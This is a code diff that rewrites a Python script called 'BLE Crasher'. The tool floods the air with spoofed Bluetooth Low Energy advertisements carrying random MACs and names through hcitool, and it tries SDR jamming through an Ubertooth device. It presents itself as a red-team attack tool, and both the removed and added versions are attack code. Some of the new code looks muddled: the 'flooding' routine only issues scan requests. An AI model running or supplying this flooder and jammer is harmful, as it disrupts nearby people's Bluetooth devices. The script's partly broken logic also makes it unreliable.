@@ -1,71 +1,107 @@
 #!/usr/bin/env python3
-# BLE Crasher - Advanced Red Team BLE Advertisement Flooding
+
+import argparse
+import os
+import sys
 import subprocess
 import random
-import argparse
 import time
-import os
-import signal
+from datetime import datetime
 
-# ANSI for clarity (no emoticons)
-RED = '\033[91m'
-GREEN = '\033[92m'
-YELLOW = '\033[93m'
-RESET = '\033[0m'
+# Optional: aioblescan-based flooding
+try:
+    from aioblescan.plugins import EddyStone
+    import aioblescan as aiobs
+    import asyncio
+except ImportError:
+    aiobs = None
 
-# Generate random MAC-like address
-def random_mac():
-    return ':'.join(f'{random.randint(0,255):02X}' for _ in range(6))
+LOG_DIR = "logs"
+os.makedirs(LOG_DIR, exist_ok=True)
+timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+log_file = f"{LOG_DIR}/ble_crash_{timestamp}.log"
 
-# Advertising with spoofed names (optional)
-def generate_adv_payload(mac=None, name="BLE_FAKE", interval=100):
-    # hcitool or better: use 'blesuite' or 'aioblescan' for full control
-    cmd = [
-        "sudo", "hcitool", "-i", "hci0", "cmd", "0x08", "0x0008",
-        "02", "01", "06",  # Flags
-        f"{len(name)+1:02x}", "09"
-    ] + [f"{ord(c):02x}" for c in name]
-    return cmd
+def log(msg):
+    with open(log_file, "a") as f:
+        f.write(msg + "\n")
+    print(msg)
 
-def cleanup():
-    print(f"{YELLOW}[*] Stopping BLE scan/flood processes...{RESET}")
-    subprocess.run(["sudo", "pkill", "-f", "hcitool lescan"], stdout=subprocess.DEVNULL)
-    subprocess.run(["sudo", "hciconfig", "hci0", "noleadv"], stdout=subprocess.DEVNULL)
+def list_hci_devices():
+    try:
+        output = subprocess.check_output(["hciconfig"], text=True)
+        return [line.split(":")[0] for line in output.splitlines() if "hci" in line]
+    except Exception as e:
+        log(f"[!] Failed to list hci devices: {e}")
+        return ["hci0"]
 
-def ble_flood(duration, name_prefix, stealth):
-    print(f"{GREEN}[+] Starting BLE Advertisement Flood (Duration: {duration}s, Name Prefix: {name_prefix}){RESET}")
+def spoof_device():
+    mac = ":".join(f"{random.randint(0,255):02X}" for _ in range(6))
+    name = f"BLE_{random.randint(1000,9999)}"
+    return mac, name
 
-    if not stealth:
-        print(f"{YELLOW}[*] Starting duplicate BLE scan (noisy)...{RESET}")
-        subprocess.Popen(["sudo", "hcitool", "-i", "hci0", "lescan", "--duplicates"],
-                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+def flood_ble_with_aioblescan(iface):
+    if aiobs is None:
+        log("[!] aioblescan not installed. Install with: pip install aioblescan")
+        return
 
-    end_time = time.time() + duration
-    while time.time() < end_time:
-        fake_mac = random_mac()
-        fake_name = f"{name_prefix}_{random.randint(100,999)}"
-        adv_cmd = generate_adv_payload(fake_mac, fake_name)
-
+    async def main():
+        event_loop = asyncio.get_event_loop()
+        socket = aiobs.create_bt_socket(iface)
+        fac = event_loop._create_connection_transport(socket, aiobs.BLEScanRequester, None, None)
+        conn, btctrl = await fac
+        await btctrl.send_scan_request()
+        log(f"[+] aioblescan BLE advertisement flooding started on {iface}")
         try:
-            subprocess.run(adv_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        except Exception as e:
-            print(f"{RED}[!] Error sending fake advertisement: {e}{RESET}")
+            await asyncio.sleep(60)  # Flood duration
+        finally:
+            await btctrl.stop_scan_request()
+            log("[✓] aioblescan BLE flooding completed.")
 
-        time.sleep(0.2)
+    asyncio.run(main())
 
-    cleanup()
-    print(f"{GREEN}[✓] BLE Flood complete.{RESET}")
+def start_ubertooth_jammer():
+    try:
+        subprocess.Popen(["ubertooth-btle", "-f"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        log("[+] Ubertooth BLE jamming started.")
+    except FileNotFoundError:
+        log("[!] ubertooth-btle not found. Skipping SDR BLE jamming.")
 
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="BLE Advertisement Flooder")
-    parser.add_argument("--duration", type=int, default=30, help="Flood duration in seconds")
-    parser.add_argument("--name", default="BLE_FAKE", help="Base name for spoofed devices")
-    parser.add_argument("--stealth", action="store_true", help="Avoid scanning to reduce noise")
+def stop_all_ble():
+    os.system("pkill -f aioblescan")
+    os.system("pkill -f ubertooth")
+
+def main():
+    parser = argparse.ArgumentParser(description="BLE Crasher - Flood BLE advertisements and jam signals")
+    parser.add_argument("--iface", default="hci0", help="BLE interface (default: hci0)")
+    parser.add_argument("--aioble", action="store_true", help="Use aioblescan for advanced flooding")
+    parser.add_argument("--jam-sdr", action="store_true", help="Use SDR (Ubertooth/HackRF) BLE jammer")
+    parser.add_argument("--duration", type=int, default=60, help="Duration of attack in seconds")
+    parser.add_argument("--export", action="store_true", help="Export spoofed device info")
     args = parser.parse_args()
 
-    try:
-        ble_flood(args.duration, args.name, args.stealth)
-    except KeyboardInterrupt:
-        cleanup()
-        print(f"{RED}[!] Interrupted by user.{RESET}")
+    log(f"=== BLE Crasher Launched ({args.iface}) ===")
+    log(f"Log: {log_file}")
 
+    if args.export:
+        for _ in range(10):
+            mac, name = spoof_device()
+            log(f"[+] Spoofed Device: {mac} ({name})")
+            time.sleep(0.5)
+
+    if args.aioble:
+        flood_ble_with_aioblescan(args.iface)
+
+    if args.jam_sdr:
+        start_ubertooth_jammer()
+
+    log("[*] BLE flooding active. Press Ctrl+C to stop.")
+    try:
+        time.sleep(args.duration)
+    except KeyboardInterrupt:
+        pass
+
+    stop_all_ble()
+    log("[✓] BLE Crasher attack complete.")
+
+if __name__ == "__main__":
+    main()
